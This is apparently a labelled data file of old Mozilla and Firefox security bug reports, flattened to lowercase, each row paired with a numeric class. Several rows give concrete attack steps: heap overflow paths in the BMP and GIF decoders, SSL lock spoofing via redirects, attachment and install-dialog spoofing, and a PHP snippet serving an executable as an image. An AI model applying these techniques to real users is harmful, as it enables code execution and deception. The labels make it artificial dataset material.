pad	3
visited support allows queries into global history we should have a pref for visited support since there are some things that can be determined about the user s history and perhaps used for other exploits if one knows they use one-click amazon purchasing or a certain bank etc using visited rules these include using getcomputedstyle or using generated content or display none to cause server hits the latter could be fixed with a parallel style context tree in limited cases which could allow the pref to disable rules only in author-level stylesheets but that s quite a bit of work	11
pop up xpinstall/security dialog when user is about to click if i can control or predict when and where a user will click i can get them to install software that s not surprising but it did n't seem to be in bugzilla it probably had n't been filed because most of possible fixes suck and/or because nobody had come up with a good exploit how can i control or predict when and where a user will click 1 a game 1a make the player pick up items by clicking them measure the speed with which the player moves the mouse and clicks and once the speed stabilizes pop up an install dialog just before the player clicks 1b force the player to click at exactly the right time a reaction-time test shoot the monkey etc 1c convince the player to double-click an object whose location i control 1d tell the player that he has infinite ammo and can shoot by pressing or holding the i button on the keyboard pop up an install dialog when the player runs out of ammo 2 pop-up hell 2a make the x for the pop-up ad appear just where a security dialog will appear 2b make fake pop-ups out of images so you can measure the victim s reaction time average mouse acceleration etc get them on the fifth pop-up i will attach a demo of 1c a game that involves double-clicking possible fixes all of which suck a when a site tries to install software or calls enableprivilege display a status bar message this page would like to install software on your computer only display the dialog after the user clicks the status bar message err how do you click a status bar message with the keyboard b add a one-second delay between when the dialog gets focus and when the install/ok button becomes enabled i say gets focus rather than appears because a site could hide an install dialog as a modal dialog of a background window for a minute and then bring the dialog to the front at a convinient time by closing the window in front c if the total time to decide to install and download the xpi are less than five seconds stall installation with the downloading dialog still up until five seconds are up so the user has an extra chance to cancel i m worried that users might not know to cancel because they do not realize that they accidentally clicked install in a dangerous dialog b and c both involve timers which might be bad for accessibility tech-time-independent	11
can drag text into file upload control mozilla allows dragging text into file upload controls see the testcase for how this can be abused suggested fix allow dragging text into normal text fields but not into file upload controls this is what ie for windows does see also bug 50660 should be able to drag files to the file upload control bug 57770 using styles clipboard to confuse text entry into file upload control	11
fix 0 in css is ignored user-agent mozilla/5.0 windows u win98 en-us rv:1.6b gecko/20031213 build identifier mozilla/5.0 windows u win98 en-us rv:1.6b gecko/20031213 in css 0 means a null character but it is ignored by mozilla ex c\0olor red is treated as color red btw a raw null character in css is treated correctly as null by mozilla ex c olor red null character x00 is not treated as color red reproducible always steps to reproduce actual results 0 in css is ignored expected results 0 in css is treated as a null character equal to a raw null character this 0 ignoring has possibility to avoid sanitizing of web application webmail etc internet explorer executes jscript in css so 0 can be a vulnerability 20031216_ie though mozilla does not executes javascript in css so far as i know it can use for web bug easily ex i\0mport	9
more to do for bug 157644 more to do for bug 157644 dan got email from zen-parse gmx.net pointing out that the fix for 157644 plugged one security hole but not them all from the reporter the correct fix is to limit the number of messages to maxint sizeof pop3msginfo if an evil server sends a larger number of messages we ll only allocate space for 50k but if part way through the list if the server introduces a message that is than the max but 50k we ll allocate more space senduidl does n't bounds check on the 50k message limit the patch in bug 157644 assumes that message numbers are sequential i ve got the complete email from zen-parse	11
certificate name matching for non-fqdns is insecure user-agent build identifier mozilla/5.0 x11 u linux i686 en-us rv:1.5 gecko/20031007 firebird/0.7 we were wondering why we do n't get cert warnings when going to a site with a cert for blahblah.internal.company.com with a url of the form a colleague found the code looks like some shadiness in mozilla/security/nss/lib/certdb/certdb.c specifically in cert_testhostname hn is the host cn is the common name in the cert if hndomain port_strchr hn null no domain in uri host name char cndomain if cndomain port_strchr cn null cndomain cn 0 there is a domain in the cn string so chop it off cndomain 0 if the uri in the browser is n't fully qualified it just checks it against the first part of the common name seems like this is intentional which is weird this is a security vulnerability an attacker could get a cert issued by verisign for www.badguys.com and impersonate www.internal.company.com assuming some users at company.com have internal.company.com set as their default search domain and access their site using the short name www imho the right way to do it would to expand the short name being accessed into a fqdn and compare them i do n't have any idea how to do this in practice it might require a browser setting unfortunately my first idea resolving the name from the cert and comparing ip addresses is also insecure it would just require the attacker to modify their own dns record for www.badguys.com to point to the same ip address as www.internal.company.com this bug makes ssl security dependent on dns security which is bad however being able to support the desired behavior is good it s nice for people to be able to use unqualified names and the security infrastructure can and should support them it would be nice if nss rather than trimming the qualification from the cn added candidate qualifications to the non-qualified host name until it got a match or ran out of candidates the hard part is where to get the candidate qualifications from reproducible always steps to reproduce	5
ssl certificate spoof allows malicious page to present ssl certificate from another site user-agent mozilla/4.0 compatible msie 6.0 windows nt 5.1 net clr 1.0.3705 net clr 1.1.4322 build identifier mozilla/5.0 windows u windows nt 5.1 en-us rv:1.6 gecko/20040113 i believe i have discovered a potential security vulnerability in mozilla 1.6 and firefox 0.8 it is likely that the bug also extends to other versions of mozilla the bug is a confidence-hack of sorts allowing a malicious page to appear encrypted and present the certificate of another site reproducible always steps to reproduce 1 create a page on a non-ssl server that has a javascript or meta redirect to the ssl-site whose certificate you want to spoof 2 your redirect should go to a script on that ssl-site that will redirect you somewhere else and you need to be able to control where 3 have the ssl-site redirect the browser to an invalid domain something syntactically invalid like 4 use firefox 0.8 to browse to the page you created in step 1 6 an error will popup in firefox click ok 7 your browser will still be on the original page from step 1 but the security lock icon will still be on in the lower-left corner of firefox 8 click the security icon and click the view button to view the certificate 9 firefox will present the certificate from the ssl-enabled site i ve created a simple test-case of the above scenario i simply searched on google for redirect.cfm to find any site with a common coldfusion redirect script i found emailfactory.com as the third result in google then i created a page to redirect the browser to this makes emailfactory.com redirect the browser to a.b c which is invalid and causes mozilla to remain on the current page and display a domain not found error you can view this example at actual results mozilla s security icon remained on and clicking it showed the certificate of the spoofed ssl site while there is an error popup notifying the user that mozilla could not resolve the domain that warning is likely not enough for the average user to realize that the security-icon and certificate visible on the page are invalid expected results the security icon should n't be on this bug has also been emailed to security mozilla.org	5
untrusted web content can display content using chrome flag in window.open user-agent mozilla/5.0 windows u windows nt 5.0 en-us rv:1.7 gecko/20040514 build identifier mozilla/5.0 windows u windows nt 5.0 en-us rv:1.7 gecko/20040514 an untrusted web page can use the chrome flag in window.open to display remote xul content without any indication it s not the browser s own ui reproducible always steps to reproduce 1 load 2 click the link actual results the remote xul window opens without any hints it s remote content expected results a security exception or the chrome flag being ignored	2
shell protocol allows access to local files and can lead to a dos user-agent mozilla/5.0 windows u windows nt 5.1 en-us rv:1.7 gecko/20040616 build identifier mozilla/5.0 windows u windows nt 5.1 en-us rv:1.7 gecko/20040616 this notice covers both a security concern and a dos 1 using the shell prefix in addresses on a windows pc allows access to the local file system afaik all shell shortcuts in ie will also work in mozilla addresses such as shell cookies passes the call to explorer and it shows the desired location address to individual files or cookies are handled by mozilla and treated as a file protocol while i have not looked into the exploitability of this behavior it would seem to be a security risk as ie has supposedly dropped this functionality in sp1 for ie 6 2 by making a request for a file that does not exist on the user s system using the shell prefix mozilla will continue to open windows until the user s system crashes so even if 1 is not percieved as a true bug 2 definately is a bug examples of both at reproducible always steps to reproduce 1.see example site 2 3 actual results various see above and example site expected results denied access to all local files	9
files in tmp world readable email attachments helper app docs user-agent mozilla/5.0 windows u windows nt 5.1 en-us rv:1.7 gecko/20040626 firefox/0.9.1 build identifier thunderbird 0.7.1 i was comparing treatment of attachments opened directly from emails on different platforms i discovered that linux builds save attachments in tmp with world readable rights this does n't seem like a good thing could n't someone else logged onto the same machine read your attachments it seems like the user profile is a better place for an attachment cache or at the very least the files could be saved with more restrictive permissions sorry if there s something i m missing and this bug report is invalid reproducible always steps to reproduce 1 find an email with an attachment 2 review open the attachment from within the email by double clicking on it actual results the attachment was saved to tmp with world readable rights expected results save it in a more secure location user profile directory and/or with more secure rights only owner readable	2
enableprivilege parameter can change the meaning of the dialog scripts calling enableprivilege can change the meaning of setences in the dialog by passing a parameter with spaces and english words as usual for enableprivilege dialog holes exploitation requires signing your script activex spyware reminds us that this is not an effective deterrent	9
1.7.2 tar.gz package has wrong permissions user-agent mozilla/5.0 x11 u linux i686 en-us rv:1.7.2 gecko/20040803 multizilla/1.6.4.0b build identifier mozilla/5.0 x11 u linux i686 en-us rv:1.7.2 gecko/20040803 multizilla/1.6.4.0b just installed the tar.gz package the package unpacks as follows nathan usr/local l mozilla insgesamt 5080 drwxrwxrwx 12 500 500 4096 2004-08-04 19:16 drwxr-xr-x 20 root root 4096 2004-08-04 19:19 rw-r r 1 root root 0 2004-08-04 19:16 autoreg rw-rw-rw 1 500 500 30869 1999-10-06 04:14 license rw-rw-rw 1 500 500 9542 2004-03-13 07:25 readme.txt rwxrwxrwx 1 500 500 20424 2004-08-03 22:07 testgtkembed rw-rw-rw 1 500 500 208 2002-08-02 00:59 bloaturls.txt drwxrwxr-x 22 500 500 4096 2004-08-04 19:16 chrome drwxrwxrwx 4 500 500 8192 2004-08-04 19:16 components drwxrwxrwx 8 500 500 87 2004-08-03 21:51 defaults rwxrwxrwx 1 500 500 5460 2004-08-03 22:07 dirver rwxrwxrwx 1 500 500 14552 2004-08-03 22:07 elf-dynstr-gc drwxrwxrwx 2 500 500 83 2004-08-03 18:59 greprefs etc etc i.e most dirs and files are world writable and belong to a non-root user as a workaround one can chmod r go-w mozilla chown r root.root mozilla please correct this problem it imposes a security risk for many non-savvy users reproducible always steps to reproduce 1 2 3	2
bmp integer overflow exploits security audit of mozilla s bmp image parsing august 2004 by gael delalleau gael.delalleau+moz m4x.org overview this report presents the results of a security audit of a part of the mozilla 1.7.2 c source code tree this security audit was done during my free time as an attempt to promote and participate to the mozilla security bug bounty program several integer overflows were found in the image parsing code of mozilla some of them leads to exploitable security bugs ranging from denial of service crash of the mozilla client to arbitrary code execution on the user s computer source code files audited mozilla/modules/libpr0n/decoders/bmp/nsbmpdecoder.cpp mozilla/modules/libpr0n/decoders/bmp/nsbmpdecoder.h parts of various related files details there are mutiple integer overflows in the code used to parse and display bmp images some of them leads to exploitable security bugs these integer overflow can be found in the bmp decoder of the libpr0n module in the os-specific code used to display images for instance the following file is used on windows systems mozilla/gfx/src/windows/nsimagewin.cpp i will now highlight all the integer overflow issues found during the audit and try to show how these various issues finally allow for arbitrary code execution 1 denial of service while parsing a malformed bmp image vulnerable systems linux windows xp other systems untested in nsbmpdecoder.cpp line 287 mrow new pruint8 mbih.width mbih.bpp 8 4 mbih.width mbih.bpp can wrap around and thus the allocated buffer can be made very small on linux mozilla 1.7.2 developpement version a negative value in the new operator will crash the client uncatched exception then mframe init is called followed by ns_ensure_sucess which ensures some sanity checks on the height width and bpp of the image however these checks are not strict enough they do not prevent mbih.width mbih.bpp from wrapping around fortunately on systems using gtk to display images like linux an additional check is done in mimage init which prevents mozilla to display the image if the width or height is greater than 32767 thus preventing arbitrary code execution on windows systems there is no limit to the height and width of the image denial of service and arbitrary code execution are possible as shown below other systems untested in nsimagewin.cpp line 160 mrowbytes calcbytesspan mbhead biwidth with 1498 nsimagewin calcbytesspan pruint32 awidth 1499 1500 print32 spanbytes 1503 spanbytes awidth mbhead bibitcount 5 1510 spanbytes 2 1513 return spanbytes 1514 awidth mbhead bibitcount is actually similar to mbih.width mbih.bpp it can wrap around so mrowbytes can be very small this value finds its way in nsbmpdecoder.cpp in the mbpr variable which is used in line 374 to allocate a buffer which can be very small due to the integer wrap around we just explained mdecoded pruint8 malloc mbpr thus at lines 420 to 428 we can end in a big loop lpos==width iterations which writes bytes to memory pointed by p which is actually our small mdecoded buffer 421 while lpos 0 422 setpixel d p 2 p 1 p 0 423 p 2 424 lpos 425 if mbih.bpp 32 426 p padding byte 427 p 428 the setpixel function writes the 3 bytes to d and increments d by 3 thus memory is being copied from the p buffer allocated in the heap to the mdecoded buffer allocated later on the same heap both buffers can be made very small so the loop will soon copy a part of the heap to another part of the heap consequences the client will crash when this big loop reaches the end of the allocated memory for the heap write attempt to an unmapped memory area it might be possible to trigger arbitrary code execution if another thread uses the corrupted heap before the crash happens or if we can allocate enough memory on the same heap to make it big enough to avoid the crash consequences on systems other than windows 32 bits not evaluated side note there are other suspicious pieces of code in nsimagewin.cpp without checks for integer overflows for instance at line 161 msizeimage mrowbytes mbhead biheight mimagebits new unsigned char msizeimage 2 arbitrary code execution while parsing a malformed bmp image vulnerable windows xp not vulnerable linux other systems untested with the same bugs there is a better way to corrupt the heap after the mdecoded pointer with arbitrary values and without crashing the client indeed we can use a rle-encoded bitmap image depth 8 bits encoded with rle8 width big enough to make mbpr wrap around small height to pass the overflow check on width height see the sample image file attached to this report line 464 the buffer is allocated but too small mdecoded pruint8 calloc mbpr 1 then we can legitimately use the rle decoder to write arbitrary data in the mdecoded buffer with the length limit being mbih.width which is a big value much bigger than the size of the buffer heap corruption with arbitrary data on the windows os is a common situation known to allow arbitrary code execution see the two screenshots showing a debugger attached to the mozilla.exe process after the crash they show that at least two exploitation techniques may be used to get control of eip and hijack the execution flow of the program a overwriting c pointers to the methods of objects stored on the heap the screenshot shows that we can land in call eax+10 where eax our arbitrary data b using standard heap overflow techniques the screenshot shows that we can land in ntdll.dll in mov ecx eax where eax and ecx are arbitrary values supplied by the attacker in the malicious image file side note in the rle decoder of nsbmpdecoder.cpp at line 568 there is mdecoding byte gfxbytesperpixel this can be abused to put the mdecoding pointer out of the bounds of the mdecoded buffer even though this does not seems to be exploitable with the current surrounding code it deserves to be fixed exploit code i did not wrote the actual exploit code because it is outside the scope of a source code audit i gave enough information to show such an exploit can be written the issue is just the same kind as many other heap overflow vulnerabilities including previous mozilla vulnerabilities like the soapparameter overflow 236618 in france the legal status of publishing exploit code is unknown at the moment further audit work on the same topic need to check other image parsers jpeg gif ico icon xpm in libpr0n for integer overflows need to check deeper the os-dependent image display code for all operating systems i audited only small parts of the gtk and win image code	11
stack based buffer overflow with vcards when previewing email message user-agent mozilla/5.0 x11 u linux i686 en-us rv:1.6 gecko/20040115 build identifier mozilla/5.0 there is stack based bufferoverflow in mozilla mail when handling vcards the stack is quite screwed it is triggered by just previewing a specially crafted message tested on mozilla 1.7 because 1.7.2 fails to build due to missing directories but the code seems present in 1.7.2 and thunderbird 0.7 also obviously the following code is quite fucked addrbook/src/nsvcardobj.cpp static void writegroup ofile fp vobject o char buf1 256 char buf2 256 pl_strcpy buf1 name_of o while o=isapropertyof o vcgroupingprop 0 pl_strcpy buf2 stringz_value_of o pl_strcat buf2 pl_strcat buf2 buf1 pl_strcpy buf1 buf2 appendsofile fp buf1 to reproduce send the vcard fuckmicrosft.vcf which will be shortly attached as attachment and then preview the message gdb info stack 9 in initpropiterator i o at nsvcardobj.cpp:383 10 in isapropertyof o id grouping at nsvcardobj.cpp:418 11 in writegroup fp o at nsvcardobj.cpp:1350 12 in 13 in 14 in 15 in 16 in 17 in 18 in georgi reproducible always steps to reproduce 1 will attach a testcase actual results stack is screwed expected results stack should not be screwed	11
text fields give scripts access to the user s clipboard text fields accept script-generated events you can not send ctrl-c this is a menu shortcut so untrusted events will be rejected but you can send ctrl-ins which is implemented in the text field itself this way you can put every text you want into the user s clipboard and you can send shift-ins to insert whatever you have in your clipboard into the text field i ve tested this on windows but it should work as well at least with kde it has same shortcuts	2
security risk tb uses ie to open javascript pop-up in news-feed items user-agent mozilla/5.0 windows u windows nt 5.0 rv:1.7.3 gecko/20040913 firefox/0.10.1 build identifier mozilla/5.0 windows u windows nt 5.0 rv:1.7.3 gecko/20040913 firefox/0.10.1 hello i have submitted a more detailed description of this issue as bug 260895 already but somehow it has remained unconfirmed and therefore i assume it has not been looked at since then i think it is a major security risk that tb chooses to open anything with ie even though firefox is the default browser at first i thought this was specific to rss feeds but it is not i have taken one of those links and placed it into an html e-mail after i receive it it is the same effect the pop-up is opened in ie here is the text of the e-mail doctype html public w3c//dtd html 4.01 transitional//en html head meta content text/html charset=iso-8859-1 http-equiv content-type title title head body bgcolor ffffff text 000000 br here is an html e-mail with a link br a href javascript commonpopup printerfriendlypopup.jhtml type=sciencenews storyid=6456643 540 525 1 printerpopup test a br note that the reuters page from which i originally took this link works correctly when i open it directly in firefox i can then click on the pop-up link and it is all displayed nicely but if i get this kind of link in tb it calls ie which is a terrible thing interestingly ie can for some reason not properly display the content if it is envoked that way tom reproducible always steps to reproduce please see bug 260895 or send yourself an html e-mail with the above specified text actual results ie is used to open the pop-up when it really should be firefox expected results open pop-up with firefox	11
crash qbcurve subdivide qbcurve midpointdivide nscssrendering drawtablebordersegment user-agent mozilla/5.0 windows u windows nt 5.1 en-us rv:1.7.3 gecko/20041022 firefox/1.0 build identifier mozilla/5.0 windows u windows nt 5.1 en-us rv:1.7.3 gecko/20041022 firefox/1.0 after visiting the url firefox terminates without any warning reproducible always steps to reproduce 1 go to the url actual results firefox terminates expected results firefox should not terminate i found this page using the mangle.cgi script i ll attach a testcase soon	11
invalid html e.g nested links causes firefox to open different url than statusbar on new tab user-agent mozilla/5.0 windows u windows nt 5.0 rv:1.7.3 gecko/20041001 firefox/0.10.1 build identifier mozilla/5.0 windows u windows nt 5.0 rv:1.7.3 gecko/20041001 firefox/0.10.1 as reported by netcraft this bug which affects ie also affects firefox the following 2 code samples cause firefox to display on the statusbar but when you open the link in a new tab it goes to google.com 1 a href table tr td a href 2 a href div a href reproducible always steps to reproduce 1 right click on sample url then choose open in new tab 2 3 actual results instead of going to mozilla.org as reported by the status bar it goes to google.com expected results firefox should go to mozilla.org or report google.com on the status bar	9
installtrigger.install does n't check for username password url spoofing user-agent mozilla/5.0 windows u windows nt 5.1 en-us rv:1.7.3 gecko/20041101 firefox/1.0rc2 build identifier mozilla/5.0 windows u windows nt 5.1 en-us rv:1.7.3 gecko/20041101 firefox/1.0rc2 between not checking for a spoofed url with a username/password and the unresizeable unwrapped dialog for xpinstall it s possible to make a fairly convincing spoofed url for an xpi with installtrigger a href javascript void installtrigger.install safety first install from update.mozilla.org a the install dialog with my font size on winxp will then say the xpi is coming from with the full url only visible by copying and pasting into another program i m not sure if it s possible to get a more convincing url than that thanks to other bugs i discovered while trying the em apparently misparses urls so any in the username even as 2f causes a download failure and the install dialog treats as an escape even as 5c so a pair are required to display one if that s the very best spoofed url possible it s not quite earth-shaking serious but then i m not a very good spoofer reproducible always steps to reproduce 1 visit url click link to install 2 add site to install-prompt whitelist 3 click link again to really install 4 vaguely examine url in install prompt think update.mozilla.org that s safe actual results the extension it s just my right-click add live bookmark for this link safe enough to actually install was installed expected results throw up the spoof-warning alert before the install prompt	9
mailnews allows cookies despite the pref even if you have the pref network.cookie.disablecookieformailnews set mailnews still allows cookies this is because moz_mail_news is not defined in cpp files and the code to check if cookies are from mailnews is inside ifdef moz_mail_news blocks so the blocks are not compiled checked by adding garbage in the blocks and gcc did n't complain about it and i do have mailnews enabled a solution would be to do like 86 but that looks like a hack filing in cookies because that is where the code lives	2
when going from a secure to a non-secure page without clicking a button in the security dialog the non-secure page appears as secure user-agent mozilla/5.0 windows u windows nt 5.1 en-us rv:1.7.5 gecko/20041107 firefox/1.0 build identifier mozilla/5.0 windows u windows nt 5.1 en-us rv:1.7.5 gecko/20041107 firefox/1.0 first of all for reproducability you must have it set so that links from other applications open in the same window and the same tab and you must have the dialog boxes that tell you when you go between secure and non-secure pages turned on i went to and then switched windows back to irc and clicked on a link in chat and then switched back to firefox after the page had loaded i clicked okay on the dialog box upon doing this the address bar went yellow/gold and the padlock appeared in the corner even though the page was not secure at jesse ruderman s recommendation i am going to classify this as a security bug i have reproduced 5 times just to confirm that it happens every time i will attach a screenshot i see a possibility that this could be used to spoof a secure site when it is not and garner passwords ect although i am not sure exactly how that would be pulled off reproducible always steps to reproduce 1 make sure you meet the requirements to reproduce i noted above 2 goto and make sure not to click anything on the security dialog 3 switch windows to something else 4 click a link in the secondary app 5 switch back to firefox 6 click okay on the dialog actual results the address bar goes yellow/gold and the padlock appears in the lower left corner as if the site were secure using https expected results regardless of which button on the dialog the user pushes it should detect that it s no longer on a secure site https and forego making the changes in appearance that would indicate security	5
out of memory in mutateprep is not well handled nstsubstring_chart mutateprep fails if the system is out of memory this is not handled by replaceprep and setcapacity memory is overwritten because replaceprep is used in string manipulating routines like copy and assign	11
crash while running javascript that has large regex user-agent mozilla/5.0 windows u windows nt 5.1 en-us rv:1.7.5 gecko/20041107 firefox/1.0 build identifier mozilla/5.0 windows u windows nt 5.1 en-us rv:1.7.5 gecko/20041107 firefox/1.0 if the number of strings compared in the regular expression ie newington|abbeville|abbotsford is more than a certain number firefox will crash on my machine that number happens to be exactly 2729 comparing 2730 values will crash firefox everytime the attachment page provided contains a regex comparing 2729 values the last entry being x changing the last entry to xa or will crash firefox reproducible always steps to reproduce 1 open attachment webpage in firefox 2 copy the address at the bottom of the page and paste it into the textarea 3 click the check button 4 if firefox does not crash try editing the script and increase the number of elements compared in the regular expression 5 the attachment page provided contains a regex comparing 2729 values the last entry being x changing the last entry to xa crashes firefox on my machine actual results crashed expected results should alert the user if the string is matched works fine in browsers	11
fix boxobject s invalidatepresentationstuff needs ability to tell document to remove it from its boxobject table we can get into situations where an element s box object becomes useless because of some sequence of events like this frames are destroyed e.g in response to opacity changes invalidatepresentationstuff is called on the box object in question but the document still holds it in its boxobject table so that when script attempts to subsequently access boxobject methods the busted boxobject with null mpresshell etc is used and none of the methods work this was noted in earlier testing versions of my new prefwindow where i had a listbox and was attempting to access properties on it after the pane was faded in the solution appears to be that in some cases when invalidatepresentationstuff is called we want to tell the document to take it out of the boxobject table which is what this patch does see also the patch in 282103 which updates the call sites in nsxuldocument	11
a buffer overflow vulnerability in gif processing that can lead to remote compromise user-agent mozilla/4.0 compatible msie 6.0 windows nt 5.1 sv1 build identifier the mozilla applications contain several image decoders for displaying images of various formats amoung the most common image formats is the graphic information file gif format the code for this parser is located in mozilla/modules/libpr0n/decoders/gif/gif2.cpp a vulnerability exists in the parsing of a netscape-specific extension block that specifies a 32-bit size integer indicating how much image data the application should buffer which is shown taken from the gif_write function parse netscape-specific application extensions case gif_consume_netscape_extension wait for specified of bytes to enter buffer else if netscape_extension 2 gs requested_buffer_fullness getint32 q 1 getn gs requested_buffer_fullness gif_wait_for_buffer_full else whilst the retrieval of this integer is fine a signed comparison occurs when performing some buffer management using this 32-bit integer which has been read directly from the file the following code contains the vulnerability case gif_delay case gif_gather print32 gather_remaining print32 request_size gs gather_request_size gather_remaining request_size gs gathered do we already have enough data in the accumulation buffer to satisfy the request this can happen after we transition from the gif_delay state after we transition from the gif_delay state if gather_remaining 0 gs gathered request_size q gs gather_head gs gather_head request_size gs state gs post_gather_state break shift remaining data to the head of the buffer if gs gathered gs gather_head gs hold memmove gs hold gs gather_head gs gathered gs gather_head gs hold if we add the data just handed to us by the netlib to what we ve already gathered is there enough to satisfy the current request if ep p gather_remaining if gs gathered finish a prior gather char hold char gs hold blockalloccat hold gs gathered char p gather_remaining gs hold pruint8 hold q gs gather_head gs hold gs gathered 0 else q p p gather_remaining gs state gs post_gather_state else char hold char gs hold blockalloccat hold gs gathered char p ep p gs hold pruint8 hold gs gather_head gs hold gs gathered ep-p return pr_success by supplying negative request_size values at various points during parsing the gs gathered variable can be made to be a negative number which is not correctly accounted for in the above code since negative numbers are n't correctly handled the logic for buffer management becomes broken and allows users to do one of two things 1 perform a negative memcpy on the heap or 2 perform a small memcpy in an out of bounds region on the heap right before the beginning of the gs hold buffer thus corrupting its chunk header specifically to trigger this second scenario if we have an already allocated gs hold buffer and specify a negative integer as a request_size that is the same distance that gs gather_head is away from gs hold the following code will move gs gather_head back to the beginning of the buffer to equal gs hold if gather_remaining 0 gs gathered request_size q gs gather_head gs gather_head request_size gs state gs post_gather_state break after this gs gathered is set to the negative request size in the gif_wait_for_buffer_full state case gif_wait_for_buffer_full gs gathered gs requested_buffer_fullness getn 1 gif_netscape_extension_block break hence it is a small negative number the next time that gif_delay/gif_gather state is entered gather_remaining will be a small positive number due to this line gather_remaining request_size gs gathered request size is 1 the next time this state is entered so 1 negative number will be a positive number since we made gs gather_head equal to gs hold in the previous step the following code branch will not be taken shift remaining data to the head of the buffer if gs gathered gs gather_head gs hold memmove gs hold gs gather_head gs gathered gs gather_head gs hold and hence a blockalloccat will occur with the destination length gs gathered negative looking at the internals of this function it is easy to see that this will add the destination length from the newly allocated buffer which is in effect a subtraction since this length is negative and copy source data to that location reproducible always steps to reproduce we can provide a sample gif file if necessary please contact me if you need this actual results this vulnerability can lead to full compromise of a mozilla-based browser iss x-force plans to do a co-ordinated release and make public a security advisory about this issue when a mozilla fix is ready to go please follow up with me personally about the timing of this notification if you need any further details we d also be glad to help	11
save image as context menu allows to silently save executables instead of images user-agent mozilla/5.0 windows u windows nt 5.1 en-us rv:1.7.7 gecko/20050414 firefox/1.0.3 build identifier mozilla/5.0 windows u windows nt 5.1 en-us rv:1.7.7 gecko/20050414 firefox/1.0.3 the context menu option save image as does not validate if the src image is valid by using absolute positioning and the moz-opacity filter an attacker can easily fool the user to think he is going to save a valid image but is downloading an executable file instead since file extensions are default disabled on windows and an exe files can have any file icon including the standard image icon the user can only tell the difference when he recognizes that the save dialog file type drop down shows application instead of an image file unlikely average users will see that or realize the consequences probably most poeple will just double-click the image file they downloaded when they are going to view it and will run the executable in that moment reproducible always steps to reproduce 1 open 2 follow instructions it seems firefox sometimes raises an the web page might have been removed or its name changed error when supplying a larger exe directly as an image source and then trying to save it is that a bug or a security feature anyway an attacker can work around this problem with a little php script like this fp fopen exe.exe rb header content-type image/gif header content-disposition inline filename=booom.exe fpassthru fp fclose fp	9
spoofing via attachment dragging from andreas sandblad secunia research sa15907 mozilla thunderbird attachment spoofing vulnerability secunia research has discovered a vulnerability in thunderbird which can be exploited by malicious people to trick users into downloading malicious attachments the vulnerability is caused due to attachments not being displayed correctly in mails this can be exploited to spoof the file extension and the associated file type icon via a combination of overly long filenames containing whitespaces and content-type headers not matching the file extension successful exploitation may lead to malware being saved to e.g the desktop note attachments can be saved by dragging the attachment or using the save as or save all functionality for files on the desktop the icon can be spoofed if it e.g is a exe or lnk file poc proof of concept the raw mail source to be sent can be found in mail.txt in poc.zip it is recommended to send it manually via a telnet session e.g telnet smtp server 25 helo smtp server mail from from rcpt to to data mail.txt quit open mail drag attachment to desktop and double click on it see attached screendumps you are vulnerable should be displayed in a dos window the vulnerability has been confirmed in thunderbird 1.0.2 for windows other versions may also be affected discovered by andreas sandblad secunia research	9
cve-2005-2353 run-mozilla.sh temporary file issue an ubuntu security advisory fixed a temporary file vulnerability in the run-mozilla.sh script when run in debug mode the run-mozilla.sh script passes gdb arguments from a temporary file which is named in a manner that makes it fairly easy to guess the temporary file should be created using the mktemp program to ensure proper file permissions and a unique filename	2
do n't fall back to insecure authentication after smtp auth failure user-agent mozilla/5.0 windows u windows nt 5.1 de-de rv:1.7.12 gecko/20050919 firefox/1.0.7 build identifier thunderbird 1.0.6 in short basically the same as bug 225809 only for smtp if secure e.g cram-md5 authentication is advertised by the server mozilla tries to authenticate using cram-md5 and if it fails it falls back to the insecure login or plain methods sending the plaintext password this can happen for example if the server is having problems or if the user mistypes the password or due to a man-in-the-middle-attack in all these cases retrying with plaintext authentication will not help and using it defeats the purpose of secure authentication which is to avoid sending the password over the wire solution 1 add a user preference never send unencrypted passwords which completely disables login and plain authentication for non-ssl connections solution 2 add a user preference of authentication to be used which defaults to auto try all auth methods supported by the server probably too technical for most users reproducible always steps to reproduce provoke cram-md5 authentication failure by mistyping password actual results password is transmitted unencrypted using plain or login expected results password should not be transmitted unencrypted subject to user preference	4
crash with evil xul testcase using table-caption/-moz-grid nsgridrow iscollapsed nsgrid getscrollbox the upcoming testcase crashes mozilla when clicking on the button talkback id tb10392796y ca n't see the tb id right now but iirc i once got appr the same stack as the one from bug 311710 so marking as a security bug for now nsgrid getscrollbox c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgrid.cpp line 1493 nsgridrowlayout getparentgridpart c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgridrowlayout.cpp line 91 nsgridrowlayout getgrid c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgridrowlayout.cpp line 176 nsgridrowlayout getgrid c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgridrowlayout.cpp line 179 nsgridrowlayout getgrid c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgridrowlayout.cpp line 124 nsgridrowleaflayout getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgridrowleaflayout.cpp line 85 nsboxframe getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/nsboxframe.cpp line 948 nsgridcell getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgridcell.cpp line 84 nsgrid getprefrowheight c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgrid.cpp line 986 nsgrid getprefrowsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgrid.cpp line 589 nsgridrowleaflayout getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgridrowleaflayout.cpp line 92 nsboxframe getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/nsboxframe.cpp line 948 nsgridcell getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgridcell.cpp line 84 nsgrid getprefrowheight c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgrid.cpp line 986 nsgrid getprefrowsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgrid.cpp line 589 nsgridrowleaflayout getprefsize c builds/tinderbox/fx-trunk/winnt_5.2_depend/mozilla/layout/xul/base/src/grid/nsgridrowleaflayout.cpp line 92 nsboxframe getprefsize c 